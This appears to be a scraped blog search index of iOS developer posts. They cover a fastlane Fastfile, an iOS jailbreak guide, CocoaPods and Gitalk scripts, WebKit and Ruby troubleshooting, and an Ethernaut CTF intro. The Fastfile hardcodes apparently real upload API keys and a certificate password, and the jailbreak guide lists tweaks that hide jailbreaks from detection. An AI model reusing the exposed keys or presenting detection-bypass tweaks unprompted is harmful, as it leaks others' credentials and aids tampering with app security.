&#x27;appstore&#x27;,        dsym: dsym_path      )    end    clean_build_artifacts  end  desc &quot;手动批量添加设备到profile&quot;  lane :add_devices_manual do    UI.header &quot;Add Device&quot;    device_hash = &#123;&#125;    device_sum = UI.input(&quot;Device Sum: &quot;).to_i    if device_sum == 0      next    end    index = 0    while index &lt; device_sum do      device_name = UI.input(&quot;Device Name: &quot;)      device_udid = UI.input(&quot;Device UDID: &quot;)      device_hash[device_name] = device_udid      index += 1    end        register_devices(        devices: device_hash    )    refresh_profiles  end  desc &quot;文件批量添加设备到profile&quot;  lane :add_devices_file do    register_devices(      devices_file: &quot;fastlane/devices.txt&quot;    )    refresh_profiles  end  desc &quot;批量导出设备&quot;  lane :export_devices do    password = UI.password(&quot;输入 #&#123;ENV[&quot;APPLE_ID&quot;]&#125; 账号密码: &quot;)    Spaceship::Portal.login(&quot;#&#123;ENV[&quot;APPLE_ID&quot;]&#125;&quot;, password)    Spaceship::Portal.select_team(team_id: &quot;#&#123;ENV[&quot;TEAM_ID&quot;]&#125;&quot;)    devices = Spaceship.device.all    File.open(&quot;#&#123;base_path&#125;/fastlane/devices.txt&quot;, &quot;wb&quot;) do |f|      f.puts &quot;Device ID\\tDevice Name&quot;      devices.each do |device|        f.puts &quot;#&#123;device.udid&#125;\\t#&#123;device.name&#125;&quot;      end    end  end  # You can define as many lanes as you want  desc &quot;更新 provisioning profiles&quot;  lane :refresh_profiles do    match(      type: &quot;development&quot;,      force: true,      force_for_new_devices: true    )    match(      type: &quot;adhoc&quot;,      force: true,      force_for_new_devices: true    )    match(      type: &quot;appstore&quot;,      force: true,      force_for_new_devices: true    )  end  desc &quot;同步 certificates 和 provisioning profiles&quot;  lane :sync_cert_profiles do    match(      type: &quot;development&quot;,      readonly: true    )    match(      type: &quot;adhoc&quot;,      readonly: true    )    match(      type: &quot;appstore&quot;,      readonly: true    )  end  desc &quot;移除本地描述文件&quot;  lane :remove_local_profiles do    app_identifiers = [&quot;#&#123;ENV[&quot;DEV_APP_IDENTIFIER&quot;]&#125;&quot;, &quot;#&#123;ENV[&quot;DEV_NOTIFICATION_SERVICE&quot;]&#125;&quot;, &quot;#&#123;ENV[&quot;PROD_APP_IDENTIFIER&quot;]&#125;&quot;, &quot;#&#123;ENV[&quot;PROD_NOTIFICATION_SERVICE&quot;]&#125;&quot;]    types = [&quot;development&quot;, &quot;adhoc&quot;, &quot;appstore&quot;]    app_identifiers.each do |app_identifier|      types.each do |type|        remove_provisioning_profile(app_identifier: app_identifier, type: type)          end    end  end  desc &quot;revoke 证书和描述文件&quot;  private_lane :revoke_cert_profiles do    ENV[&quot;MATCH_SKIP_CONFIRMATION&quot;] = &quot;1&quot;    sh(&quot;fastlane match nuke development&quot;)    sh(&quot;fastlane match nuke distribution&quot;)  end  desc &quot;生成APNs证书&quot;  lane :generate_apns_cert do    pem(      development: true,       force: true,       app_identifier: &quot;#&#123;ENV[&quot;DEV_APP_IDENTIFIER&quot;]&#125;&quot;,       p12_password: &quot;GXM&quot;, output_path: &quot;fastlane/pem&quot;    )    pem(      development: false,       force: true,       app_identifier: &quot;#&#123;ENV[&quot;DEV_APP_IDENTIFIER&quot;]&#125;&quot;,       p12_password: &quot;GXM&quot;, output_path: &quot;fastlane/pem&quot;    )    pem(      development: true,       force: true,       app_identifier: &quot;#&#123;ENV[&quot;PROD_APP_IDENTIFIER&quot;]&#125;&quot;,       p12_password: &quot;GXM&quot;, output_path: &quot;fastlane/pem&quot;    )    pem(      development: false,       force: true,       app_identifier: &quot;#&#123;ENV[&quot;PROD_APP_IDENTIFIER&quot;]&#125;&quot;,       p12_password: &quot;GXM&quot;, output_path: &quot;fastlane/pem&quot;    )  end  desc &quot;同步 metadata&quot;  lane :sync_metadata do    ENV[&quot;DELIVER_FORCE_OVERWRITE&quot;] = &quot;1&quot;    sh(&quot;fastlane deliver download_metadata --metadata_path #&#123;ENV[&quot;DOWNLOAD_METADATA_PATH&quot;]&#125;&quot;)  end  desc &quot;拷贝 dSYM&quot;  private_lane :copy_dsym do |options|    type = String(options[:type] || &quot;adhoc&quot;)    dsym_path = lane_context[SharedValues::DSYM_OUTPUT_PATH]    share_dir = File.join(ENV[&#x27;HOME&#x27;],&#x27;/Public/iOS&#x27;, &quot;#&#123;ENV[&quot;SCHEME_NAME&quot;]&#125;&quot;, &quot;#&#123;type&#125;&quot;)    FileUtils.mkdir_p(share_dir)    FileUtils.cp_r(File.join(dsym_path), share_dir)  end  desc &quot;上传 ipa，type: [pgyer,gxm], log: desc&quot;  private_lane :upload_ipa do |options|    type = options[:type] || &#x27;pgyer&#x27;    log = options[:log] || &#x27;&#x27;    log = String    if type == &quot;pgyer&quot;      pgyer(        api_key: &#x27;0098b94391ff417d86837343597789a9&#x27;,        user_key: &#x27;4ca1278171177f624ba3f3cc39eb2d73&#x27;,        update_description: log      )    else      sh(&quot;curl -X &#x27;POST&#x27; &#x27;https://fabu.guoxiaomei.com/api/apps/5dca5121f3920d001f71e42d/upload&#x27; -H &#x27;Content-Type: multipart/form-data&#x27; -H &#x27;accept: application/json&#x27; -H &#x27;apikey: 07a0840834294e7b89c41ab9c302c852&#x27; -F &#x27;file=@#&#123;lane_context[SharedValues::IPA_OUTPUT_PATH]&#125;&#x27;&quot;)    end  end  after_all do |lane|    # This block is called, only if the executed lane was successful    # slack(    #   message: &quot;Successfully deployed new App Update.&quot;    # )  end  error do |lane, exception|    # slack(    #   message: exception.message,    #   success: false    # )  endend# More information about multiple platforms in fastlane: https://github.com/fastlane/fastlane/blob/master/fastlane/docs/Platforms.md# All available actions: https://docs.fastlane.tools/actions# fastlane reports which actions are used. No personal data is recorded. # Learn more at https://github.com/fastlane/fastlane#metrics\n\n以上 fastlane 满足基本的功能需求。\n","categories":["iOS"],"tags":["fastlane","CI"]},{"title":"iOS 越狱指南","url":"/2020/05/24/jailbreak-user-guide/","content":"越狱软件越狱软件统计（更新日期：2020-05-24）\n\n\n越狱软件\n最新版本\n支持设备\n支持版本\n源码\n\n\n\nunc0ver\n5.0.0\nA7 ~ A13\niOS 11.0 ~ 13.5\nhttps://github.com/pwn20wndstuff/Undecimus/\n\n\ncheckra1n\n0.10.2 beta\niPhone 5s ~ iPhone X\niOS 12.3 ~\n未释放\n\n\nChimera\n1.4.0\n所有设备\niOS 12 ~ 12.2 and 12.4，tvOS 12 ~ 12.2 and 12.4\nhttps://github.com/coolstar/Chimera13\n\n\nElectra\n1.3.2\n所有设备\niOS 11.0 – 11.4.1\nhttps://github.com/coolstar/electra\n\n\nMeridian\nv0.9-007 Pre-Release\n所有64位设备\niOS 10 ~ 10.3.3\nhttps://github.com/PsychoTea/MeridianJB\n\n\nDoubleh3lix\nRC8\n所有64位A7 ~ A9\niOS 10.x\n无\n\n\nyalu102\nbeta7\n所有64位设备除了iPhone7\niOS 10.x\nhttps://github.com/kpwn/yalu102\n\n\n越狱工具\nCydia Impactor\n\n\nNote: This method requires an Apple developer account.\nDownload Cydia Impactor for the applicable OS.\nExtract the application file, and open it.\nConnect your iOS device.\nDownload the latest version of unc0ver from above.\nDrag the IPA file into the Impactor window.\nEnter your Apple ID and password (requires developer account). (Note: If you are using two factor authentication, generate an app specific password, and use that here.)\nOn your iOS device, open Settings → General → Device Management and tap on your Apple ID.\nTrust unc0ver.\nOpen unc0ver and jailbreak!\n\n\nAltStore\nDownload AltStore. Use the link for your operating system.\nUnzip and move AltStore to your Applications folder.\nLaunch the AltStore application.\nClick on the AltStore icon in the Menu Bar, and then click on the Install Mail Plug-in option.\nOpen the Mail app, and click on Mail → Preferences in the menu bar.\nOpen the General tab in mail preferences, click Manage Plug-ins, check AltPlugin, and apply and restart Mail.\nConnect your iOS device via USB.\nClick AltStore in the menu bar, then go to Install AltStore → (Your iOS Device)\nLogin with your Apple ID when prompted and click install.\nOn your iOS device, open Settings → General → Device Management and tap on your Apple ID.\nTrust AltStore.\nTap the “Open in AltStore” button located above.\nAltStore will now install the app. Wait until it finishes.\nOpen unc0ver and jailbreak!\n\n\niOS App Signer\nInstall Xcode, open it, and agree to the license agreement.\nPlug in your iOS device and select it as the build target.\nOpen Xcode and create a new iOS Application.\nType a name and identifier.\nXcode will complain about the lack of a provisioning profile. Click fix issue.\nSign into an Apple ID when prompted.\nDownload iOS App Signer\nDownload the latest version of unc0ver from above.\nOpen iOS App Signer.\nSelect the ipa you just downloaded as an input file.\nClick start.\nReturn to Xcode. Go to the menu bar. Click Window → Devices.\nFind your device, click the plus, and select the file created by iOS App Signer.\nOpen unc0ver on your device and jailbreak!\n\n\n\nCydia源&amp;常用软件BigBoss源：http://apt.thebigboss.org/repofiles/cydia/\n\nOpenSSH\nFLEXing\nLookinLoader\nLocationFakerX\nAnyWhere!–虚拟定位\n\nBinger源：https://apt.bingner.com/\n\nClass Dump\n\nFrida源：https://build.frida.re/\n\nFrida\n\nChariz源：https://repo.chariz.com/\n\nCephei\nNewTerm\nQuitAll\n\nTIGI Software源：https://tigisoftware.com/cydia/\n\nApps Manager\nFilza File Manager\n\nMatchstic源：https://repo.incendo.ws/\n\nReProvision\n\n雷锋源源：https://apt.abcydia.com/\n\nAppStore++ 应用降级\niCleaner Pro\nNetControl 联网控制\nShadow 屏蔽越狱检测\neSim+ 双卡增强\nFlyJB 屏蔽越狱检测\nNtSpeed 悬浮网速\nFilza File 文件管理器\nCacheClearerXI 缓存清理\nSnapper 2 智能截图\nCarBridge 汽车互联\nAudioRecorder XS 通话录音\n\n","categories":["iOS"],"tags":["jailbreak"]},{"title":"CocoaPods 快速使用 Swift 静态库","url":"/2020/07/28/swift-use-static-framework/","content":"想在项目中使用静态库功能，需要在 Podspec 显示指定 s.static_framework &#x3D; true，对于多个 Pod 的项目来说，一个个改起来太麻烦了，也不现实。但是 CocoaPods 是 Ruby 写的，我们可以通过 patch CocoaPods 来实现在只写几行代码的情况下，把所有 pod 变成 Static Framework。\n通过分析 CocoaPods 的源代码发现，CocoaPods 会通过  Pod -&gt; Installer -&gt; Analyzer -&gt; determine_build_type 这个方法来决定每个 podspec 的 build type，我们可以通过 patch 这个方法来改写。\n在 Podfile 的同级目录创建 patch_static_framework.rb\nmodule Pod    class Installer        class Analyzer            def determine_build_type(spec, target_definition_build_type)                if target_definition_build_type.framework?                    # 过滤掉只能动态库方式的framework，或者不确定的framework                    dynamic_frameworks = [&#x27;xxxxx&#x27;]                    if !dynamic_frameworks.include?(spec.root.name)                        return BuildType.static_framework                    end                    root_spec = spec.root                    root_spec.static_framework ? BuildType.static_framework : target_definition_build_type                else                    BuildType.static_library                end            end        end    endend\n\n在 Podfile 的最上面，引入该文件\nrequire_relative &#x27;patch_static_framework&#x27;\n\n这样 patch 就会在 pod install 的时候生效，我们就不需要改每个 Pod 的 Podspec 就可以实现每个 Pod 都是 static_framework。\n","categories":["iOS"],"tags":["Swift","CocoaPods","Static Framework"]},{"title":"使用自定义 Module 解决 Objective-C 库的引用","url":"/2020/08/03/cocoapods-custom-swift-module/","content":"LLVM Module\nA module is a single unit of code distribution—a framework or application that is built and shipped as a single unit and that can be imported by another module with Swift’s import keyword.\nEach build target (such as an app bundle or framework) in Xcode is treated as a separate module in Swift. If you group together aspects of your app’s code as a stand-alone framework—perhaps to encapsulate and reuse that code across multiple applications—then everything you define within that framework will be part of a separate module when it’s imported and used within an app, or when it’s used within another framework.\nAs the docs indicate, the module is an application or a framework (library). If you create a project with classes A and B, they are part of the same module. Any other class in the same project can inherit from those classes. If you however import that project to another project, classes from that another project won’t be able to subclass A nor B. For that you would have to add open indicator before their declarations.\nBasically, if you work on a single app then you are working in one single module and unless declared as private or fileprivate, the classes can subclass each other.\n\nModuleModule 是一种集成库的方式，在 Module 出现之前，开发者需要在引入库文件的同时引入需要使用的头文件，以保证编译的正常进行。但是每次引入库的时候都要导入一堆文件，看起来并不优雅。Module 和 Framework 的出现让开发者极大程度上告别了这些不优雅的工作。简单说就是用树形的结构化描述来取代以往的平坦式 #include， 例如传统的 #include &lt;stdio.h&gt; 现在变成了 import std.io。\n主要好处有：\n\n语义上完整描述了一个框架的作用\n提高编译时可扩展性，只编译或 include 一次。避免头文件多次引用，只解析一次头文件甚至不需要解析（类似预编译头文件）\n减少碎片化，每个 module 只处理一次，环境的变化不会导致不一致\n对工具友好，工具（语言编译器）可以获取更多关于 module 的信息，比如链接库，比如语言是 C++ 还是 C\n\nmodulemap 文件module.map 文件就是对一个框架，一个库的所有头文件的结构化描述。通过这个描述，桥接了新语言特性和老的头文件。默认文件名是 module.modulemap，modulemap 其实是为了兼容老标准，不过现在 Xcode 里的还都是这个文件名，相信以后会改成新名字。\n文件的内容以 Module Map Language 描述，大概语法如下：\nmodule MyLib &#123;  explicit module A &#123;    header &quot;A.h&quot;    export *  &#125;  explicit module B &#123;    header &quot;B.h&quot;    export *  &#125;&#125;\n类似上面的语法，描述了 MyLib、MyLib.A、MyLib.B 这样的模块结构。\n官方文档中有更多相关内容，可以描述框架，描述系统头文件，控制导出的范围，描述依赖关系，链接参数等等。这里不多叙述，举个 libcurl 的例子：\nmodule curl [system] [extern_c] &#123;    header &quot;/usr/include/curl/curl.h&quot;    link &quot;curl&quot;        export *&#125;\n\n将此 modulemap 文件放入任意文件夹，通过 Xcode 选项或者命令行参数，添加路径到 import search path （swift 的 -I 参数）。 然后就可以在 Swift 代码里直接通过 import curl 导入所有的接口函数、结构体、常量等。\nXcode 选项位于 Build Settings 下面的 Swift Compiler - Search Paths 。添加路劲即可。\n每个Module中必须包涵一个umbrella头文件，这个文件用来import所有这个Module下的文件。\n大致关系为：import module -&gt; import umbrella header -&gt; other header\n使用 Module 库的调用方式：\n\n\n\n项目类型\nOC库(GDTPackage)\nSwift库(GDTPackage)\n\n\n\nOC 项目\n#import &lt;GDTPackage&#x2F;GDTPackage.h&gt;\n#import &lt;GDTPackage-Swift.h&gt;\n\n\nSwift 项目\nimport GDTPackage\nimport GDTPackage\n\n\nGDTPackage.h 其实就是 umbrella header/master header。\nCocoaPods 自定义 Module我们以桥接 GDTMobSDK 为例。\n创建 GDTPackage 库通过 CocoaPods 提供的命令行创建库：\n$ pod lib create GDTPackage\n\n创建 module.modulemap 和 BridgeHeader.h在项目中新建 module.modulemap 和 BridgeHeader.h，将它们放在同一个文件夹下 GDTPackage/Module。\nmodule.modulemap 代码如下：\nmodule GDTPackageBridge &#123;    header &quot;BridgeHeader.h&quot;    export *&#125;\n\nBridgeHeader.h 代码如下：\n#import &lt;GDTMobSDK/GDTMobBannerView.h&gt;#import &lt;GDTMobSDK/GDTRewardVideoAd.h&gt;#import &lt;GDTMobSDK/GDTNativeExpressAd.h&gt;#import &lt;GDTMobSDK/GDTNativeExpressAdView.h&gt;#import &lt;GDTMobSDK/GDTMobInterstitial.h&gt;#import &lt;GDTMobSDK/GDTSplashAd.h&gt;\n\nGDTPackage.podspec 部分代码：\n...  s.static_framework = true  s.source_files = &#x27;GDTPackage/Classes/**/*&#x27;    s.preserve_paths = [&#x27;GDTPackage/Module/module.modulemap&#x27;, &#x27;GDTPackage/Module/BridgeHeader.h&#x27;]  s.pod_target_xcconfig = &#123;    # 路径根据实际情况进行引用，必须保证路径是正确的    &#x27;SWIFT_INCLUDE_PATHS&#x27; =&gt; [&#x27;$(PODS_ROOT)/GDTPackage/Module&#x27;, &#x27;$(PODS_TARGET_SRCROOT)/GDTPackage/Module&#x27;]  &#125;  s.dependency &#x27;GDTMobSDK&#x27;...\n\n代码中引用 GDTPackageBridgeimport GDTPackageBridgeclass GDTPackage &#123;    func test() &#123;        GDTSplashAd.init()    &#125;&#125;\n\n注意事项\n如果已经在 preserve_paths 添加了 modulemap 和 header，可以不用在 source_files 里再加一遍，如果要在 source_files 里加也可以，记得指定 public_header_files。如果没有指定，你自己创建的 modulemap 也会当做 public 处理。这样 lint 的时候会报 Include of non-modular header inside framework module。\n\nlint 时遇到 Include of non-modular header inside framework module 错误，可以在后面添加 --use-libraries。虽然能验证和上传通过，但是其他项目引用的时候还是会有问题。\n\nuser_target_xcconfig 是针对所有 Pod 的，可能和其他 Pod 存在冲突。pod_target_xcconfig 是针对当前 Pod 的。\n\n\n参考链接\nModules - Clang 12 documentation\n\n","categories":["iOS"],"tags":["Objective-C","Swift","CocoaPods"]},{"title":"Gitalk 评论批量初始化","url":"/2020/08/06/gitalk-comments-batch-initialize/","content":"第一次使用 Gitalk 时，之前的文章的评论都需要初始化一下，如果文章多的话，挺麻烦的。不过，有些博客有提供接口获取博客上所有文章的相关信息，那其实就可以通过脚本来完成之前文章的评论初始化。下面是一些已经写好的脚本，可以直接使用或参考。\nGitalk 官方的 WiKi 里记录的方法年久失修，已经不能使用，我重新整理了一份。\n获得权限在使用该脚本之前首先要在 GitHub 创建一个新的 Personal access tokens，选择 Generate new token 后，在当前的页面中为 Token 添加所有 Repo 的权限。\n自动化脚本安装脚本依赖库$ gem install faraday activesupport sitemap-parser nokogiri\n\n使用 sitemap 文件找到博客对应的 sitemap 文件，例如 https://chaosky.tech/sitemap.xml。\n使用脚本在任意目录创建 comment.rb，将下面的代码粘贴到文件中：\nrequire &#x27;open-uri&#x27;require &#x27;faraday&#x27;require &#x27;active_support&#x27;require &#x27;active_support/core_ext&#x27;require &#x27;sitemap-parser&#x27;require &#x27;digest&#x27;require &#x27;nokogiri&#x27;username = &quot;xwal&quot; # GitHub 用户名token = &quot;xxxxxx&quot;  # GitHub Tokenrepo_name = &quot;xwal.github.io&quot; # 存放 issuessitemap_url = &quot;https://chaosky.tech/sitemap.xml&quot; # sitemapkind = &quot;Gitalk&quot;sitemap = SitemapParser.new sitemap_urlurls = sitemap.to_aconn = Faraday.new(:url =&gt; &quot;https://api.github.com/repos/#&#123;username&#125;/#&#123;repo_name&#125;/issues&quot;) do |conn|  conn.basic_auth(username, token)  conn.adapter Faraday.default_adapterendurls.each_with_index do |url, index|  id = Digest::MD5.hexdigest URI(url).path  response = conn.get do |req|    req.params[&quot;labels&quot;] = [kind, id].join(&#x27;,&#x27;)    req.headers[&#x27;Content-Type&#x27;] = &#x27;application/json&#x27;  end  response_hash = JSON.load(response.body)    if response_hash.count == 0    document = Nokogiri::HTML(open(url))    title = document.xpath(&quot;//head/title/text()&quot;).to_s    desc = document.xpath(&quot;//head/meta[@name=&#x27;description&#x27;]/@content&quot;).to_s    body = url + &quot;\\n\\n&quot; + desc    puts title    response = conn.post do |req|      req.body = &#123; body: body, labels: [kind, id], title: title &#125;.to_json    end    puts response.body  end  sleep 15 if index % 20 == 0end\n\n在这里有 5 个配置项，分别是 GitHub 用户名、在上一步获得的 Token、存放 issues 的仓库、sitemap 的地址以及最后你在博客中使用了哪个评论插件，不同的插件拥有标签，可以选择 “Gitalk” 或者 “gitment”。\n运行脚本$ ruby comment.rb\n\n参考链接\nhttps://github.com/gitalk/gitalk/wiki/评论初始化\nhttps://draveness.me/git-comments-initialize/\n\n","categories":["Blog"],"tags":["gitalk"]},{"title":"在 Mac 上使用 Safari 调试 iOS WebView","url":"/2020/09/08/Safari-Web-Inspector-For-iOS-WebView/","content":"准备工作Mac OSSafari 开启调试模式依次选择 偏好设置 &gt; 高级 &gt; 在菜单栏中显示“开发”菜单。\n\n\niOSSafari 开启调试模式要远程调试 iOS Safari ，必须启用 Web 检查 功能，打开 iPhone 依次进入 设置 &gt; Safari &gt; 高级 &gt; Web 检查 &gt; 启用。\n\n\n开发调试启动 Web Inspector\niPhone 使用 Safari 浏览器打开要调试的页面，或者 App 里打开要调试的页面\nMac 打开 Safari 浏览器调试（菜单栏 &gt; 开发 &gt; iPhone 设备名 -&gt; 选择调试页面）\n在弹出的 Safari Developer Tools 中调试\n\n调试菜单\nResources这个菜单用来显示当前网页中加载的资源，比如 HTML、JS、CSS、图片、字体等资源文件，并且可以对 JS 代码添加断点来调试代码。\n断点Inspector 中的断点调试和 Xocde 的大同小异。\n格式化代码web 页面中的 JS、CSS、HTML 文件大多数都经过了压缩处理，以前 inspector 并不支持 HTML，这次可以格式化 HTML 文件了：\nLocal overrides如果你想调试某个文件的时候，通常把改动好的代码推动服务端，然后通过浏览器访问，查看效果，整个过程可能会耗费很长时间。Local overrides 提供了一种能力，可以替换当前页面所加载的文件，这样只需要修改本地文件即可，当页面加载的时候会直接使用本地的文件，达到快速调试的作用。更多内容。\nBootstrap ScriptBootstrap Script 也叫引导程序，通常是程序执行时第一个要执行的文件，在 Inspector 中可以创建一个这样的文件用来作为调试工具使用，比如替换某个函数的实现，给某个函数增加特殊的调试语句。在调试的时候，很多 JS 函数都经过了压缩处理，可通过这种方式把压缩的函数替换成未被压缩的函数，方便调试。更多内容\nTimelinesTimelines 用来分享各种功能的加载时长。\nSotragestorage 用来显示缓存的数据，比如 Local Storage、Session Storage、Indexed DataBase。\nLayersLayers 主要用来显示页面的绘制、布局。\nConsoleconsole 就是打印日志的地方，也可以执行 JavaScript 代码。Console 的界面如下：\n\n","categories":["iOS"],"tags":["Tips","WebView","Inspector"]},{"title":"WebKit的iOS 14 适配问题","url":"/2021/05/16/WebKit-iOS-14-adaptation-issues/","content":"最近在做 iOS 14 的 WebKit API 适配遇到一些问题记录下。\nFatal error: Bug in WebKit: Received neither result or failure.: file WebKit&#x2F;WebKitSwiftOverlay.swift, line 66问题现象webView.evaluateJavaScript(&quot;console.log(&#x27;Hello World&#x27;)&quot;, in: nil, in: .page) &#123; result in    print(result)&#125;\n在 iOS 14.0 的版本中执行以上的代码会产生crash  Fatal error: Bug in WebKit: Received neither result or failure.: file WebKit/WebKitSwiftOverlay.swift, line 66 ，但是在最新版 14.5 不会崩溃。\n定位问题在 WebKit 官方代码WebKit&#x2F;WebKit 中找到了这段产生crash的代码。\nfunc makeResultHandler&lt;Success, Failure&gt;(_ handler: @escaping (Result&lt;Success, Failure&gt;) -&gt; Void) -&gt; (Success?, Failure?) -&gt; Void &#123;    return &#123; success, failure in        if let success = success &#123;            handler(.success(success))        &#125; else if let failure = failure &#123;            handler(.failure(failure))        &#125; else &#123;            fatalError(&quot;Bug in WebKit: Received neither result or failure.&quot;)        &#125;    &#125;&#125;\n\n查看源码可知，当 JavaScript 执行没有返回值，也没有错误的时候就会产生fatalError，比如执行console.log(&#39;Hello World&#39;)。\n但是在 WebKit 的 main 分支最新代码中已经没有这段代码了，取而代之的是使用 ObjCBlockConversion.boxingNilAsAnyForCompatibility。\n为了找到是在哪次commit中修复了这个问题，通过查询WebKitSwiftOverlay.swift文件的git修改记录，找到有这么一次commit，里面记录了这个crash修复的过程，有兴趣的可以去看看。\nhttps://github.com/WebKit/WebKit/commit/534def4b8414c5ca1bf3712272ad24eaf271b134#diff-93ac6a04946f8372bfaec900fdcab57ef95932e9f30f45e7115a9ea807b82e6c\n问题已经找到，那就需要确定是在哪个版本的 iOS 中修复了这个问题。\n首先需要找到 iOS 版本对应的 WebKit 版本。\n在 Wikipedia 上有维护 Safari version history Safiri 版本和对应的 WebKit 版本，但是遗憾的是最新版本的 iOS 14 还没有该记录。\n那接下来如何找到 WebKit 版本呢？\n需要分为两部分，首先先确定Xcode里集成的 iOS 编译库，再确定老版本的 iOS，老版本的iOS可以从Xcode 的 Components 下载对应版本的Simulator。\n以 Xcode 12.5 为例。在 /Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Library/Developer/CoreSimulator/Profiles/Runtimes/ 路径下找到 iOS.simruntime，再找到 WebKit Contents/Resources/RuntimeRoot/System/Library/Frameworks/WebKit.framework/WebKit。\n完整路径为：/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Library/Developer/CoreSimulator/Profiles/Runtimes/iOS.simruntime/Contents/Resources/RuntimeRoot/System/Library/Frameworks/WebKit.framework。\n通过 otool -L 命令找到对应的WebKit 版本。\n$ otool -L WebKit | grep WebKit                                      [23:42:54]WebKit:\t/System/Library/Frameworks/WebKit.framework/WebKit (compatibility version 1.0.0, current version 611.1.21)\t/System/Library/PrivateFrameworks/WebKitLegacy.framework/WebKitLegacy (compatibility version 1.0.0, current version 611.1.21, reexport)\n其中 611.1.21 就是对应的 WebKit 的版本。\nXcode 通过 Components 下载的 Simulator 版本路径在 /Library/Developer/CoreSimulator/Profiles/Runtimes 下，用同样的方式确定 iOS 版本的 WebKit 版本。\n\n\n\niOS 版本\nWebKit 版本\n\n\n\niOS 14.5\n611.1.21\n\n\niOS 14.4\n610.4.3\n\n\niOS 14.3\n610.3.7\n\n\niOS 14.2\n610.2.11\n\n\n最后在 WebKit&#x2F;Webkit 上确认对应的修复版本，最终确认修复的版本为 iOS 14.3。\n总结对 evaluateJavaScript 方法做兼容，不能直接使用 #available(iOS 14.0, *) 适配。\nif #available(iOS 14.3, *) &#123;    webView.evaluateJavaScript(&quot;console.log(&#x27;Hello World&#x27;)&quot;, in: nil, in: .page) &#123; result in        print(result)    &#125;&#125; else &#123;    webView.evaluateJavaScript(&quot;console.log(&#x27;Hello World&#x27;)&quot;) &#123; value, error in        print(value)    &#125;&#125;\n\n","categories":["iOS"],"tags":["WebKit","WebView"]},{"title":"missing compatible arch in ffi_c.bundle on M1 with system Ruby","url":"/2021/06/17/missing-arch-in-ffi/","content":"解决 Apple Silicon (M1) 上 LoadError - dlsym(0x7fbb17932d30, Init_ffi_c): symbol not found - /Library/Ruby/Gems/2.6.0/gems/ffi-1.15.3/lib/ffi_c.bundle 问题。\n首先通过 file /Library/Ruby/Gems/2.6.0/gems/ffi-1.15.3/lib/ffi_c.bundle 查看这个文件的架构：\n/Library/Ruby/Gems/2.6.0/gems/ffi-1.15.3/lib/ffi_c.bundle: Mach-O universal binary with 2 architectures: [x86_64:Mach-O 64-bit bundle x86_64] [arm64e:Mach-O 64-bit bundle arm64e]/Library/Ruby/Gems/2.6.0/gems/ffi-1.15.3/lib/ffi_c.bundle (for architecture x86_64):\tMach-O 64-bit bundle x86_64/Library/Ruby/Gems/2.6.0/gems/ffi-1.15.3/lib/ffi_c.bundle (for architecture arm64e):\tMach-O 64-bit bundle arm64e\n\n上面的信息有x86_64和arm64e，虽然包含了arm64e，但是此arm64e不是M1 对应的arm64。也就是说架构是不对的。\n那我们接着往下看，先查询下系统ruby的版本 ruby --version。\nruby 2.6.3p62 (2019-04-16 revision 67580) [universal.arm64e-darwin20]\n\n版本和时间都有，2019-04-16 的版本，但是 M1 是 2020 年出来的，不一定适配了新的架构。\n那我们就必须得确认当前ruby的真实架构。我们可以通过一段代码获取 arch.rb：\nrequire &#x27;rbconfig&#x27;OSVERSION = RbConfig::CONFIG[&#x27;host_os&#x27;]CPU = RbConfig::CONFIG[&#x27;host_cpu&#x27;]ARCH = RbConfig::CONFIG[&#x27;arch&#x27;]puts &quot;OS: #&#123;OSVERSION&#125;&quot;puts &quot;CPU: #&#123;CPU&#125;&quot;puts &quot;Arch: #&#123;ARCH&#125;&quot;\n\n执行 ruby arch.rb：\nOS: darwin20CPU: x86_64Arch: universal-darwin20\n\n诡异的一幕出现了，CPU架构却是x86_64而不是arm64，也就是说造成ffi无法运行的原因是ruby版本不支持 arm64。\n问题找到了那接下来这个问题就好解决了，安装最新的ruby版本。\n可以通过 brew install ruby，也可以通过 rbenv 或者 rvm 来安装。\n我使用 brew install ruby 来安装最新的版本。\n通过 brew 安装的 ruby 并不会生效，需要添加到环境变量中 echo &#39;export PATH=&quot;/opt/homebrew/opt/ruby/bin:$PATH&quot;&#39; &gt;&gt; ~/.zshrc。\n为了验证是否有效我们先测试下新版本的架构，先设置当前shell的环境变量 export PATH=&quot;/opt/homebrew/opt/ruby/bin:$PATH&quot;。\n执行 ruby --version：\nruby 3.0.1p64 (2021-04-05 revision 0fb782ee38) [arm64-darwin20]\n\n执行 ruby arch.rb：\nOS: darwin20CPU: arm64Arch: arm64-darwin20\n\nCPU 架构正确，继续安装 CocoaPods gem install cocoapods。\n成功！！！\n","categories":["iOS"],"tags":["CocoaPods","ruby"]},{"title":"0. Hello Ethernaut","url":"/2022/04/29/0-Hello-Ethernaut/","content":"Difficulty: 0&#x2F;10Level: https://ethernaut.openzeppelin.com/level/0x4E73b858fD5D7A5fc1c3455061dE52a53F35d966\n本节主要就是一个新手教学，让人先了解游戏玩法及闯关模式，需要对 MetaMask、JavaScript、console等有基本了解。\n打开 Developer Console (F12) ，输入\nplayer\n\n会打印当前钱包地址。\n依步骤了解指令用法，按 Get new instance 开始闯关。MetaMask 会弹出交易请求，确认以部署关卡合约，关卡正式开始。\n打开 Developer Console (F12) ，依次输入:\n&gt; await contract.info()&lt; &quot;You will find what you need in info1().&quot;&gt; await contract.info1()&lt; &quot;Try info2(), but with &quot;hello&quot; as a parameter.&quot;&gt; await contract.info2(&quot;hello&quot;)&lt; &quot;The property infoNum holds the number of the next info method to call.&quot;&gt; await contract.infoNum()&lt; BN &#123;negative: 0, words: [42, empty], length: 1, red: null&#125;&gt; await contract.info42()&lt; &quot;theMethodName is the name of the next method.&quot;&gt; await contract.theMethodName()&lt; &quot;The method name is method7123949.&quot;&gt; await contract.method7123949()&lt; &quot;If you know the password, submit it to authenticate().&quot;&gt; await contract.password()&lt; &quot;ethernaut0&quot;&gt; await contract.authenticate(&quot;ethernaut0&quot;)\n\n最后会弹出一个 MetaMask 的交易请求，确认后再按 Submit instance，再确认后 Console 会弹出 “You have completed this level!!!” 即本关完成。\n","categories":["Web3"],"tags":["ethernaut"]},{"title":"The Ethernaut 解析","url":"/2022/04/29/The-Ethernaut/","content":"Ethernaut 是一个基于 Web3&#x2F;Solidity 的对抗游戏，每一关都有一个带有安全问题的智能合约供玩家去模拟攻击。 \n游戏要求玩家具备 JavaScript、MetaMask和Solidity 智能合约相关知识，所有合约均为开源，玩家可以浏览 Ethernaut 网站 在 Rinkeby 测试网络中游玩。或者到 Github 下载源代码。\n相关知识储备\nJavaScript\nChrome DevTools\nMetaMask\nEthereum\nEthereum 